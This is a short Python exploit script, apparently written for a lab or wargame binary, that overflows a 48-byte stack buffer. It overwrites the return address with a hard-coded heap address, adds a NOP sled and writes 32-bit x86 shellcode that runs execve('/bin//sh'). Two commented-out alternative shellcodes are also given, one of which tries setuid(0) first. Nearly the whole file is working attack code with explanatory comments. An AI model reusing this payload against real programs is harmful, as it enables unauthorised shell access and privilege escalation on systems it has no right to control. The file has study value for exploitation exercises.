#!/bin/python3
import sys

padding = "i" * 48 # stack is 48 bytes long. 'i' is \x69 in ascii.

# variable "Name" is saved at "\xc0\xac\x0d\x08"
# but some 'A's and the ret_addr is also written there,
# so we add 13 more words to the address. \xc0 + \x34 = \xf4.
# 34 in hex is 52 in dec, so 13 words
addr = "\xf4\xac\x0d\x08"

# http://shell-storm.org/shellcode/files/shellcode-237.php
shell = "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"

# http://shell-storm.org/shellcode/files/shellcode-473.php
# The below tries to setuid(0), if it fails, then I get a segmentation.
# shell = "\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80\xb0\x0b\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"
# Same script without setuid(0), that works but is a byte longer than the setuid version and 11 longer than the one i use
# shell = "\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"


fd = open(1,"wb") # open file descriptor, writing bytes

#'raw_unicode_escape' is obligatory so that we dont have escapes and broken pipes
fd.write(padding.encode(encoding="raw_unicode_escape")) # we cycle through the stack
fd.write(addr.encode(encoding="raw_unicode_escape")) # we overwrite the ret_addr

#no reason for no-Ops since I know were to jump on the heap.
#But for the shake of trying this aswell lets sliiiiiiiide.
nop = "\x90" * 44 #if more than 48, we overwrite ret_addr again
fd.write(nop.encode(encoding="raw_unicode_escape"))

#with the noops above, we are finally at address Name+96
fd.write(shell.encode(encoding="raw_unicode_escape"))

fd.close()